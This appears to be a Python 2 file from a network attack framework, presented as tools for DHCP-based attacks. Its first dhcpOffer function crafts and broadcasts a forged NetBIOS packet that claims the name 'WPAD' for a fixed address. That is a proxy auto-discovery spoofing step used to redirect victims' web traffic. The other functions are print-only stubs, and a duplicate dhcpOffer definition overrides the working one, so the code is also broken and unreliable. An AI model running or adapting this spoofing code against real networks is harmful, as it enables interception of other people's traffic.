#!/usr/bin/python
#################
#This file contains the tools necessary to execute DHCP Based Attacks
#################
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time
import os
import re
import sys
import threading
sys.path.append('/usr/share/subterfuge')

def dhcpOffer():
   print "Registering to the Workgroup"
   
      #Build Registration Information
      #Ethernet Layer
   dstmac = "ff:ff:ff:ff:ff:ff"
   srcmac = "f0:7b:cb:4d:d6:6f"
   type = 0x0800
      #IP Layer
   srcip     = "10.31.33.74"
   dstip     = "10.31.33.91"
   
      #Transmission Layer (UDP)
   sport     = 41984
   dport     = 137
   
      #Build NBNS Packet
   packet   = Ether(dst=dstmac, src=srcmac)
   packet  /= IP(dst=dstip, src=srcip)
   packet  /= UDP(sport=sport, dport=dport)
   packet  /= NBNSQueryRequest(NAME_TRN_ID= 11386,\
                                  FLAGS=0x8500,\
                                  QDCOUNT=1,\
                                  ANCOUNT=0,\
                                  NSCOUNT=0,\
                                  ARCOUNT=0,\
                                  QUESTION_NAME= 'WPAD           ',\
                                  SUFFIX    = "workstation",\
                                  NULL=0,\
                                  QUESTION_TYPE= "NB",\
                                  QUESTION_CLASS= "INTERNET",\
                                  TTL= 259200,\
                                  RDLENGTH=6,\
                                  NB_FLAGS= 0,\
                                  NB_ADDRESS= "10.31.33.92")
   sendp(packet,verbose=0)
   
   
def dhcpACK():
   print "Sending DHCP Acknowledgment"
   
      #For WPAD
   print "Setting Option 252"
   
def dhcpOffer():
   print "Registering to the Workgroup"
   
   
def dhcpInform():
   print "Registering to the Workgroup"